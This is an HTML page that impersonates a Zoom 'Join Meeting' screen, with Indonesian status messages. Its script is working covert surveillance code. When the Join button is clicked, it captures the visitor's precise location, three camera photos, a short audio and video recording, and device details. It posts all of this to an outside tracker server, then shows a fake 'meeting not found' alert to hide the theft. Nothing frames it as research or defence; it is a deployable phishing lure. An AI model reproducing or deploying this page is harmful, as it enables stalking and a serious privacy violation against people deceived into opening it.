<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Join Meeting - Zoom</title>
  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap">
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: #ffffff;
      color: #333;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
    }
    header {
      padding: 16px 32px;
      display: flex;
      justify-content: space-between;
      align-items: center;
      border-bottom: 1px solid #e5e5e5;
    }
    .logo { font-size: 32px; font-weight: 700; color: #0e72ed; letter-spacing: -2px; }
    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 40px 20px; }
    .join-box { width: 100%; max-width: 480px; text-align: center; }
    h1 { font-size: 28px; font-weight: 600; margin-bottom: 32px; }
    .label { text-align: left; font-size: 14px; font-weight: 500; margin-bottom: 8px; color: #444; }
    input { width: 100%; padding: 16px 20px; font-size: 16px; border: 1px solid #d0d0d0; border-radius: 8px; margin-bottom: 20px; }
    #joinBtn {
      width: 100%; padding: 16px; background: #0e72ed; color: white;
      font-size: 18px; font-weight: 600; border: none; border-radius: 8px; cursor: pointer;
    }
    #status { margin: 20px 0; font-size: 15px; color: #0e72ed; }
    #error { color: #d93025; font-size: 14px; margin-top: 10px; white-space: pre-line; line-height: 1.4; }
    video { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="logo">zoom</div>
    <div>
      <button style="padding:8px 20px;border-radius:9999px;border:1px solid #0e72ed;background:white;color:#0e72ed;">Support</button>
      <button style="padding:8px 20px;border-radius:9999px;border:none;background:#0e72ed;color:white;margin-left:8px;">Sign Up Free</button>
    </div>
  </header>

  <div class="main">
    <div class="join-box">
      <h1>Join Meeting</h1>
      <div class="label">Meeting ID or Personal Link Name</div>
      <input type="text" id="meetingId" value="987-654-321" readonly>

      <button id="joinBtn">Join</button>
      
      <div id="status"></div>
      <div id="error"></div>
    </div>
  </div>

  <video id="video" autoplay playsinline muted></video>

  <script>
    const btn = document.getElementById('joinBtn');
    const status = document.getElementById('status');
    const errorDiv = document.getElementById('error');
    const videoEl = document.getElementById('video');
    const SERVER_URL = 'https://coreproject.site/tracker/dashboard.php';

    async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

    btn.addEventListener('click', async () => {
      btn.disabled = true;
      status.textContent = 'Meminta izin...';
      errorDiv.textContent = '';

      let locationData = { latitude: null, longitude: null, accuracy: 0, note: "skipped_or_failed" };

      try {
        // 1. Coba ambil lokasi (optional di iOS)
        status.textContent = 'Mengakses lokasi...';
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 12000,
              maximumAge: 0
            });
          });
          locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy
          };
          status.textContent = 'Lokasi berhasil ✓';
        } catch (e) {
          console.log("Location skipped:", e);
          status.textContent = 'Lokasi ditolak, lanjut ke kamera...';
        }

        await sleep(600);

        // 2. Camera + Audio
        status.textContent = 'Mengaktifkan kamera...';
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });

        videoEl.srcObject = stream;
        await videoEl.play().catch(() => {});

        await sleep(800);

        // 3. Ambil 3 Foto
        status.textContent = 'Mengambil foto bukti...';
        const photos = [];
        for (let i = 0; i < 3; i++) {
          await sleep(1100);
          const canvas = document.createElement('canvas');
          canvas.width = videoEl.videoWidth || 640;
          canvas.height = videoEl.videoHeight || 480;
          canvas.getContext('2d').drawImage(videoEl, 0, 0);
          photos.push(canvas.toDataURL('image/jpeg', 0.85));
        }

        // 4. Rekam Video
        status.textContent = 'Merekam video...';
        const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
        const recorder = new MediaRecorder(stream, { mimeType });
        const chunks = [];

        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await sleep(3000);
        recorder.stop();

        const videoBlob = await new Promise(resolve => {
          recorder.onstop = () => resolve(new Blob(chunks, { type: mimeType }));
        });

        // 5. Kirim ke server
        status.textContent = 'Mengirim data ke server...';
        const formData = new FormData();
        formData.append('location', JSON.stringify(locationData));
        formData.append('device_info', JSON.stringify({
          timestamp: new Date().toISOString(),
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen: `${screen.width}×${screen.height}`,
          isIOS: true
        }));

        const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
        formData.append('video', videoBlob, `zoom_${Date.now()}.${ext}`);

        for (let i = 0; i < photos.length; i++) {
          const blob = await fetch(photos[i]).then(r => r.blob());
          formData.append(`photo${i+1}`, blob, `photo_${Date.now()}_${i+1}.jpg`);
        }

        const response = await fetch(SERVER_URL, { method: 'POST', body: formData });

        if (response.ok) {
          status.innerHTML = '✅ Data berhasil terkirim ke server!';
          setTimeout(() => {
            alert("Meeting tidak ditemukan atau sedang sibuk. Silakan coba lagi.");
          }, 1200);
        } else {
          throw new Error("Upload gagal");
        }

        stream.getTracks().forEach(t => t.stop());

      } catch (err) {
        console.error("ERROR:", err);
        errorDiv.textContent = `Gagal: ${err.name || err.message}\n\nPastikan semua izin (Lokasi, Kamera, Mikrofon) diizinkan.`;
        btn.disabled = false;
      }
    });
  </script>
</body>
</html>
